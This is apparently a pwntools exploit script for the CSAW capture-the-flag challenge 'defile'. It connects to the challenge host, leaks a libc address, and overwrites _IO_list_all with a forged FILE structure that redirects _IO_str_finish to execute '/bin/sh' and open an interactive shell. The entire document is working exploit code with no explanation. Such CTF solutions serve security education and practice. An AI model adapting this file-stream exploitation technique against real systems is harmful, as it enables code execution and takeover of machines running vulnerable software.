from pwn import *

e = ELF("./defile")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("pwn.chal.csaw.io", 1000)
else:
  p = process(e.path
  )
  #{"LD_PRELOAD": libc.path})

p.recvuntil("0x")
leak = int(p.recvline(), 16) - 0x7f96e8c8b760 + 0x00007f96e889f000
print("{:#x}".format(leak))

p.sendlineafter("?", str(0x100))
p.sendafter("?", str(leak + libc.symbols["_IO_list_all"]))
p.recvuntil("?")


binsh = leak + next(libc.search("/bin/sh"))
p.sendline(
  p64(leak + libc.symbols["_IO_list_all"] + 8)
  + p64((binsh + 0x10) & ~1)
  + p64(0) * 4
  + p64(1)
  + p64(0)
  + p64(binsh)
  + p64(0) * 12
  + p64(2)
  + p64(3)
  + p64(0)
  + "\xff" * 8
  + p64(0) * 2
  + p64(leak + libc.symbols["_IO_str_finish"] - 0x18)
  + p64(0)
  + p64(0x1337)
  + p64(leak + libc.symbols["_IO_list_all"] + 31 * 8)
)
gdb.attach(p)

p.interactive()
